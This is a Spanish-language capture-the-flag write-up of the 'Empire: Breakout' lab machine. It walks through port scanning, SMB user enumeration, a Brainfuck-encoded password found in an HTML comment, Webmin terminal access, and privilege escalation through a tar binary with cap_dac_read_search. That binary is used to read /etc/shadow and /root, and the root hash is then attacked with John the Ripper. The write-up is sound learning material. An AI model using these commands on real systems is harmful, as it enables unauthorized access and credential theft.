# Empire: Breakout

## # Máquina: Empire Breakout

**IP:** 192.168.56.103
**OS:** Linux (Debian)
**Dificultad:** Easy
**Servicios Clave:** HTTP / Webmin / Samba
**Fecha:** 2026-04-19
**Skills:** #WebEnum #Brainfuck #Webmin #LinuxCapabilities #JohnTheRipper

---

## 1. Reconocimiento

Escaneo completo de puertos con detección de versiones y scripts:

```shell
nmap -p- -sV -sC --min-rate 5000 192.168.56.103
```

Resultado relevante:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80 | HTTP | Apache 2.4.51 (Debian) |
| 139/445 | SMB | Samba 4.13.5 |
| 10000 | HTTP | MiniServ 1.981 (Webmin) |
| 20000 | HTTP | MiniServ 1.830 (Webmin) |

Los scripts NSE revelaron:
- Nombre NetBIOS de la máquina: **BREAKOUT**
- SMB con firma habilitada pero no obligatoria (vulnerable a NTLM relay)
- Dos instancias de Webmin en puertos distintos con versiones diferentes

---

## 2. Enumeración Web

### Puerto 80 — Apache página por defecto

Gobuster no encontró rutas relevantes más allá de `/manual`. Sin embargo, al inspeccionar el **código fuente** de la página principal (`Ctrl+U`) se encontró un comentario HTML oculto al final del documento:

```html
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
-->
```

El texto cifrado es código **Brainfuck** — un lenguaje de programación esotérico. Decodificado en `https://www.dcode.fr/brainfuck-language`:

```
.2uqPEfj3D<P'a-3
```

### Enumeración de usuarios con SMB

Con los puertos 139/445 abiertos, se lanzó enum4linux para obtener usuarios del sistema:

```shell
enum4linux -a 192.168.56.103
```

En la sección de RID cycling apareció:

```
S-1-22-1-1000 Unix User\cyber (Local User)
```

El prefijo **S-1-22-1** identifica usuarios Unix locales reales del sistema. Usuario encontrado: **cyber**.

> Con usuario y contraseña completos: `cyber` / `.2uqPEfj3D<P'a-3`

---

## 3. Acceso Inicial — Webmin

### Elección del vector

Se buscaron exploits para ambas versiones de Webmin:

```shell
searchsploit webmin 1.830
searchsploit webmin 1.981
```

Todos los exploits relevantes requerían autenticación previa. Con las credenciales obtenidas, se probó login en ambos puertos. Acceso conseguido en el **puerto 20000** (Webmin 1.830).

### Ejecución de comandos

Dentro del panel de Webmin, en el menú **Others → Terminal**, se encontró una terminal web interactiva que permitía ejecutar comandos directamente como el usuario `cyber`.

```shell
ls
# tar  user.txt

cat user.txt
# 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

**Flag de usuario obtenida:** `3mp!r3{You_Manage_To_Break_To_My_Secure_Access}`

---

## 4. Escalada de Privilegios

### Reconocimiento

```shell
id        # uid=1000(cyber) gid=1000(cyber)
sudo -l   # sudo: command not found
find / -perm -4000 -type f 2>/dev/null
# Binarios SUID estándar — ninguno explotable
```

### Linux Capabilities — el vector real

```shell
getcap -r / 2>/dev/null
# /home/cyber/tar cap_dac_read_search=ep
# /usr/bin/ping cap_net_raw=ep
```

El binario `/home/cyber/tar` tenía la capability **`cap_dac_read_search`**, que le permite ignorar los permisos de lectura del sistema de archivos. Esto significa que puede leer cualquier archivo del sistema aunque normalmente no tenga permisos — incluyendo `/etc/shadow`.

### Extracción del hash de root

```shell
./tar -cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar
cat etc/shadow
# root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919...
```

### Intento de crackeo con John

```shell
echo 'root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:99999:7:::' > hash_root.txt
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash_root.txt
```

> El hash yescrypt (`$y$`) es extremadamente lento de crackear. John tardaba días con rockyou.txt.

### Lectura directa del directorio root

Dado que `cap_dac_read_search` permite leer cualquier archivo, se usó el mismo tar para leer directamente el contenido del directorio `/root/`:

```shell
./tar -cvf root_dir.tar /root/ 2>/dev/null
./tar -xvf root_dir.tar 2>/dev/null
ls root/
# rOOt.txt
cat root/rOOt.txt
# 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```

**Flag de root obtenida:** `3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}`

---

## 5. Resumen del ataque

```
Nmap → Puerto 80, 139/445, 10000 (Webmin 1.981), 20000 (Webmin 1.830)
         ↓
Código fuente puerto 80 → comentario HTML con contraseña en Brainfuck
         ↓
Brainfuck decoder → .2uqPEfj3D<P'a-3
         ↓
enum4linux → usuario: cyber
         ↓
Login Webmin puerto 20000 → Others → Terminal → shell como cyber
         ↓
Flag usuario: 3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
         ↓
getcap → /home/cyber/tar con cap_dac_read_search=ep
         ↓
./tar lee /root/ ignorando permisos
         ↓
Flag root: 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation} ✅
```

---

## 6. Lecciones aprendidas

- Siempre revisar el **código fuente** de las páginas web (`Ctrl+U`) — los comentarios HTML pueden contener información sensible.
- Los prefijos **S-1-22-1** en enum4linux identifican usuarios Unix reales — son los que interesan.
- Cuando todos los exploits requieren autenticación, el objetivo es **conseguir credenciales primero** antes de intentar explotar.
- Los **binarios SUID** no son el único vector de escalada — las **Linux Capabilities** son igual de peligrosas y no aparecen con `find -perm -4000`.
- `cap_dac_read_search` permite leer cualquier archivo del sistema, lo que hace innecesario crackear contraseñas si puedes leer directamente la flag.
- Los hashes **yescrypt** (`$y$`) son muy lentos de crackear — si hay otra vía, úsala primero.
